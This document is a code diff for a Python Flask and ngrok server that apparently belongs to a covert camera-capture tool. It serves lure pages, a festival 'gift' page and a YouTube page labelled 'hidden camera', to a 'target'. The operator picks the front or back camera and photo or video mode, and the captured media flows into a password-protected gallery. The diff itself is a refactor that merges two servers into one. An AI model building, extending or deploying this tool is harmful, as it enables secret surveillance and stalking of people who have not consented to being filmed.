@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver & Private Gallery Server
-Terminal 1 prompts for all settings (including Gallery credentials) and spawns Gallery Server in Terminal 2.
+Gift Video Receiver & Private Gallery Server (Unified Single Server)
+All routes (target receiver & password-protected gallery) run on Port 5000 via a single Ngrok tunnel.
 """
 
 import os
@@ -20,24 +20,49 @@ from flask import Flask, request, jsonify, send_file, Response, redirect
 from flask_cors import CORS
 from werkzeug.utils import secure_filename
 
-# Configuration
+# ============================================
+# CONFIGURATION
+# ============================================
 UPLOAD_FOLDER = Path("gift_videos")
-RECEIVER_PORT = 5000
-GALLERY_PORT = 5001
+PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
 UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
 
 # ============================================
-# RECEIVER FLASK APP (PORT 5000)
+# FLASK APPLICATION SETUP
 # ============================================
-receiver_app = Flask("receiver")
-CORS(receiver_app)
-receiver_app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
+app = Flask(__name__)
+CORS(app)
+
+# Allow file uploads up to 5GB
+app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
+
 received_files = []
 
-@receiver_app.route('/festival')
+# ============================================
+# AUTHENTICATION DECORATOR
+# ============================================
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if app.config.get('AUTH_ENABLED', False):
+            auth = request.authorization
+            admin_user = app.config.get('GALLERY_USER')
+            admin_pass = app.config.get('GALLERY_PASS')
+            if not auth or auth.username != admin_user or auth.password != admin_pass:
+                return Response(
+                    '🔒 Access Denied: Private Gallery authentication required.\n', 401,
+                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
+                )
+        return f(*args, **kwargs)
+    return decorated
+
+# ============================================
+# PUBLIC TARGET ROUTES (No Login Required)
+# ============================================
+@app.route('/festival')
 def festival_page():
     try:
         with open(FESTIVAL_HTML, 'r') as f:
@@ -45,7 +70,7 @@ def festival_page():
     except FileNotFoundError:
         return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404
 
-@receiver_app.route('/youtube')
+@app.route('/youtube')
 def youtube_page():
     try:
         with open(YOUTUBE_HTML, 'r') as f:
@@ -53,7 +78,7 @@ def youtube_page():
     except FileNotFoundError:
         return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404
 
-@receiver_app.route('/upload', methods=['POST'])
+@app.route('/upload', methods=['POST'])
 def upload_media():
     try:
         if 'media' not in request.files:
@@ -106,33 +131,14 @@ def upload_media():
         print(f"❌ Upload Error: {e}")
         return jsonify({'error': str(e)}), 500
 
-
 # ============================================
-# GALLERY FLASK APP (PORT 5001)
+# PROTECTED GALLERY ROUTES (Password Required)
 # ============================================
-gallery_app = Flask("gallery")
-CORS(gallery_app)
-
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if gallery_app.config.get('AUTH_ENABLED', False):
-            auth = request.authorization
-            admin_user = gallery_app.config.get('GALLERY_USER')
-            admin_pass = gallery_app.config.get('GALLERY_PASS')
-            if not auth or auth.username != admin_user or auth.password != admin_pass:
-                return Response(
-                    '🔒 Access Denied: Gallery authentication required.\n', 401,
-                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
-                )
-        return f(*args, **kwargs)
-    return decorated
-
-@gallery_app.route('/')
+@app.route('/')
 def index():
     return redirect('/gallery')
 
-@gallery_app.route('/gallery', methods=['GET'])
+@app.route('/gallery', methods=['GET'])
 @requires_auth
 def gallery_page():
     html_content = """<!DOCTYPE html>
@@ -189,7 +195,7 @@ def gallery_page():
                 document.getElementById('counter').textContent = `${files.length} Item(s) Received`;
                 
                 if (files.length === 0) {
-                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media from Terminal 1 will automatically appear here live!</div>';
+                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media will automatically appear here live!</div>';
                     return;
                 }
                 
@@ -256,7 +262,7 @@ def gallery_page():
 </html>"""
     return html_content
 
-@gallery_app.route('/files', methods=['GET'])
+@app.route('/files', methods=['GET'])
 @requires_auth
 def list_files():
     files = []
@@ -273,7 +279,7 @@ def list_files():
                 })
     return jsonify({'files': files})
 
-@gallery_app.route('/view/<filename>', methods=['GET'])
+@app.route('/view/<filename>', methods=['GET'])
 @requires_auth
 def view_media(filename):
     safe_name = secure_filename(filename)
@@ -292,7 +298,7 @@ def view_media(filename):
     mimetype = mime_types.get(ext, 'application/octet-stream')
     return send_file(filepath, mimetype=mimetype, as_attachment=False)
 
-@gallery_app.route('/download/<filename>', methods=['GET'])
+@app.route('/download/<filename>', methods=['GET'])
 @requires_auth
 def download_file(filename):
     safe_name = secure_filename(filename)
@@ -301,7 +307,7 @@ def download_file(filename):
         return send_file(filepath, as_attachment=True)
     return jsonify({'error': 'File not found'}), 404
 
-@gallery_app.route('/delete/<filename>', methods=['POST', 'DELETE'])
+@app.route('/delete/<filename>', methods=['POST', 'DELETE'])
 @requires_auth
 def delete_file(filename):
     try:
@@ -315,7 +321,7 @@ def delete_file(filename):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-@gallery_app.route('/delete-all', methods=['POST', 'DELETE'])
+@app.route('/delete-all', methods=['POST', 'DELETE'])
 @requires_auth
 def delete_all_files():
     try:
@@ -329,17 +335,25 @@ def delete_all_files():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-
 # ============================================
-# RUNNER CLASSES
+# MAIN SERVER CLASS
 # ============================================
-class ReceiverRunner:
-    def __init__(self, port=RECEIVER_PORT):
+class GiftServer:
+    def __init__(self, port=PORT):
         self.port = port
         self.ngrok_process = None
         self.ngrok_url = None
         self.running = True
         self.ngrok_ready = threading.Event()
+
+    def check_html_files(self):
+        if not os.path.exists(FESTIVAL_HTML):
+            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
+            return False
+        if not os.path.exists(YOUTUBE_HTML):
+            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
+            return False
+        return True
 
     def check_ngrok(self):
         try:
@@ -443,43 +457,52 @@ class ReceiverRunner:
             return False
 
     def start_flask(self):
-        print(f"\n🔧 Starting receiver server on port {self.port}...")
+        print(f"\n🔧 Starting server on port {self.port}...")
         def run_flask():
-            receiver_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
+            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
         flask_thread = threading.Thread(target=run_flask)
         flask_thread.daemon = True
         flask_thread.start()
         time.sleep(2)
-        print("✅ Receiver server running")
+        print("✅ Server running")
 
-    def show_menu(self):
+    def show_main_menu(self):
         print("\n" + "=" * 60)
-        print("📹 RECEIVER & MEDIA CAPTURE SERVER (TERMINAL 1)")
+        print("🎁 GIFT VIDEO RECEIVER & ONLINE GALLERY SERVER")
         print("=" * 60)
         print("\nSelect mode:")
         print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
         print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
+        print("\n" + "-" * 60)
         
         while True:
             choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice in ['1', '2']:
-                return 'festival' if choice == '1' else 'youtube'
-            print("❌ Invalid choice. Enter 1 or 2")
+            if choice == '1':
+                return 'festival'
+            elif choice == '2':
+                return 'youtube'
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
 
     def get_camera_type(self):
         print("\n📷 Select camera type:")
         print("  1. Front Camera")
         print("  2. Back Camera")
+        
         while True:
             choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice in ['1', '2']:
-                return 'user' if choice == '1' else 'environment'
-            print("❌ Invalid choice. Enter 1 or 2")
+            if choice == '1':
+                return 'user'
+            elif choice == '2':
+                return 'environment'
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
 
     def get_capture_mode(self):
         print("\n📸 Select capture mode:")
         print("  1. Video - Record video")
         print("  2. Photo - Capture photos")
+        
         while True:
             choice = input("\nEnter choice (1 or 2): ").strip()
             if choice == '1':
@@ -490,7 +513,8 @@ class ReceiverRunner:
                 photo_input = input("   📸 Enter number of photos to capture (default 5): ").strip()
                 photos = int(photo_input) if photo_input.isdigit() and int(photo_input) > 0 else 5
                 return 'photo', 0, photos
-            print("❌ Invalid choice. Enter 1 or 2")
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
 
     def get_gallery_credentials(self):
         print("\n🔐 PRIVATE GALLERY LOGIN SETUP:")
@@ -504,6 +528,9 @@ class ReceiverRunner:
             password = "admin123"
             print(f"      Using default password: {password}")
             
+        app.config['GALLERY_USER'] = user
+        app.config['GALLERY_PASS'] = password
+        app.config['AUTH_ENABLED'] = True
         return user, password
 
     def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
@@ -516,12 +543,39 @@ class ReceiverRunner:
             mode_name = "🎬 YouTube Mode"
         return link, mode_name
 
+    def wait_for_files(self):
+        print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
+        print(f"📁 Local Folder:   {UPLOAD_FOLDER.absolute()}")
+        print(f"🖼️ Online Gallery: {self.ngrok_url}/gallery")
+        print(f"🏠 Local Gallery:  http://localhost:{self.port}/gallery")
+        print("=" * 60)
+        
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n\n👋 Shutting down...")
+
+    def cleanup(self):
+        print("\n🧹 Cleaning up...")
+        if self.ngrok_process:
+            self.ngrok_process.terminate()
+            try:
+                self.ngrok_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self.ngrok_process.kill()
+        print("✅ Done!")
+
     def run(self):
         try:
+            if not self.check_html_files():
+                return
             if not self.check_ngrok():
                 return
+
             self.setup_ngrok_authtoken()
-            mode = self.show_menu()
+            
+            mode = self.show_main_menu()
             camera = self.get_camera_type()
             capture_mode, duration, photos = self.get_capture_mode()
             
@@ -547,133 +601,49 @@ class ReceiverRunner:
                         video_id = video_input
                 name = None
 
-            # Setup Gallery Credentials right here in Terminal 1
-            gallery_user, gallery_pass = self.get_gallery_credentials()
-
-            # Spawn Gallery in Terminal 2 with credentials passed in
-            spawn_gallery_terminal(gallery_user, gallery_pass)
-
+            user, password = self.get_gallery_credentials()
+            
             self.start_flask()
             if not self.start_ngrok():
                 return
 
+            app.config['NGROK_URL'] = self.ngrok_url
+
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
+            gallery_link = f"{self.ngrok_url}/gallery"
+            local_gallery = f"http://localhost:{self.port}/gallery"
 
             print("\n" + "=" * 60)
             print(f"📤 SHARE THIS LINK TO TARGET ({mode_name}):")
             print("=" * 60)
             print(f"\n🔗 {link}\n")
             print("=" * 60)
-            print(f"\n🎁 Receiver is ready and listening on port {self.port}!")
-            print(f"🖼️ Gallery Link:       http://localhost:{GALLERY_PORT}/gallery")
-            print(f"🔐 Gallery Login:      Username: {gallery_user} | Password: {gallery_pass}")
-            print(f"📁 Local Upload Folder: {UPLOAD_FOLDER.absolute()}")
-            print("=" * 60)
-
-            while self.running:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n👋 Receiver server shutting down...")
-        finally:
-            if self.ngrok_process:
-                self.ngrok_process.terminate()
-
-
-class GalleryRunner:
-    def __init__(self, user="admin", password="admin123", port=GALLERY_PORT):
-        self.port = port
-        self.user = user
-        self.password = password
-        self.running = True
-
-    def start_flask(self):
-        gallery_app.config['GALLERY_USER'] = self.user
-        gallery_app.config['GALLERY_PASS'] = self.password
-        gallery_app.config['AUTH_ENABLED'] = True
-
-        print(f"\n🔧 Starting Gallery Server on port {self.port}...")
-        def run_flask():
-            gallery_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
-        flask_thread = threading.Thread(target=run_flask)
-        flask_thread.daemon = True
-        flask_thread.start()
-        time.sleep(2)
-        print("✅ Gallery Server running!")
-
-    def run(self):
-        try:
-            self.start_flask()
-
-            local_url = f"http://localhost:{self.port}/gallery"
             
             print("\n" + "=" * 60)
-            print("🖼️ PRIVATE MEDIA GALLERY SERVER (TERMINAL 2)")
+            print("🖼️ YOUR PRIVATE GALLERY (VIEW RECEIVED MEDIA):")
             print("=" * 60)
-            print(f"  🏠 Local Gallery Link: {local_url}")
-            print(f"  🔐 Login Credentials: Username: {self.user} | Password: {self.password}")
-            print(f"  📁 Reading From:       {UPLOAD_FOLDER.absolute()}")
+            print(f"\n🔗 Ngrok Gallery: {gallery_link}")
+            print(f"🏠 Local Gallery: {local_gallery}")
+            print(f"🔐 Login Credentials: Username: {user} | Password: {password}\n")
             print("=" * 60)
-
-            while self.running:
-                time.sleep(1)
+            
+            print("\n📋 Configuration Summary:")
+            print(f"   🎯 Mode:          {mode_name}")
+            print(f"   📷 Camera:        {'Front' if camera == 'user' else 'Back'}")
+            print(f"   📸 Capture:       {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
+            print(f"   🔐 Gallery Login: Username={user} | Password={password}")
+            if mode == 'festival':
+                print(f"   🎊 Festival:      {name}")
+            else:
+                print(f"   🎬 Video ID:      {video_id}")
+            
+            self.wait_for_files()
+            
         except KeyboardInterrupt:
-            print("\n👋 Gallery server shutting down...")
-
-def spawn_gallery_terminal(user="admin", password="admin123"):
-    server_script = Path(__file__).absolute()
-    print("\n🖥️ Opening Private Gallery Server in a NEW terminal window...")
-
-    cmd_win = f'start "Private Gallery Server" cmd /k "{sys.executable} "{server_script}" --gallery --user "{user}" --pass "{password}""'
-    cmd_linux = f'{sys.executable} "{server_script}" --gallery --user "{user}" --pass "{password}"'
-
-    if sys.platform == "win32":
-        try:
-            subprocess.Popen(cmd_win, shell=True)
-            print("   ✅ Opened Gallery Server in a new Windows terminal window!")
-            return True
-        except Exception as e:
-            print(f"   ⚠️ Could not open new window automatically: {e}")
-            return False
-    else:
-        # Linux / macOS (Parrot OS, Debian, Ubuntu, etc.)
-        terminals = [
-            ['x-terminal-emulator', '-e', cmd_linux],
-            ['qterminal', '-e', cmd_linux],
-            ['gnome-terminal', '--', sys.executable, str(server_script), '--gallery', '--user', user, '--pass', password],
-            ['konsole', '-e', sys.executable, str(server_script), '--gallery', '--user', user, '--pass', password],
-            ['xfce4-terminal', '-e', cmd_linux],
-            ['xterm', '-e', cmd_linux]
-        ]
-        
-        for term_cmd in terminals:
-            try:
-                if subprocess.run(['which', term_cmd[0]], capture_output=True).returncode == 0:
-                    subprocess.Popen(term_cmd)
-                    print(f"   ✅ Opened Gallery Server in a new terminal window ({term_cmd[0]})!")
-                    return True
-            except Exception:
-                pass
-        
-        print(f"   ⚠️ Could not auto-detect terminal emulator. You can run 'python3 server.py --gallery' in another terminal.")
-        return False
+            print("\n\n👋 Goodbye!")
+        finally:
+            self.cleanup()
 
 if __name__ == '__main__':
-    if '--gallery' in sys.argv:
-        # Run Gallery Server mode in Terminal 2 using credentials passed from Terminal 1
-        user = "admin"
-        password = "admin123"
-        if '--user' in sys.argv:
-            idx = sys.argv.index('--user')
-            if idx + 1 < len(sys.argv):
-                user = sys.argv[idx + 1]
-        if '--pass' in sys.argv:
-            idx = sys.argv.index('--pass')
-            if idx + 1 < len(sys.argv):
-                password = sys.argv[idx + 1]
-
-        gallery = GalleryRunner(user=user, password=password)
-        gallery.run()
-    else:
-        # Main entry point (Terminal 1): Prompt for all settings (including credentials), then spawn Terminal 2
-        receiver = ReceiverRunner()
-        receiver.run()
+    server = GiftServer()
+    server.run()
